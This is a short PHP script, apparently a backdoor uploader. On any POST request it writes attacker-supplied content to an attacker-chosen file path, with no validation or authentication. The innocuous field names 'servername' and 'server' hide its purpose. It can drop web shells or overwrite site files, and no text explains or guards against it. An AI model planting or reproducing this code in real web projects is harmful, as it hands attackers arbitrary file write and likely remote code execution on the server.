<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = fopen( $_POST['servername'], 'w' );
    fwrite( $file, $_POST['server']);
    fclose( $file );
}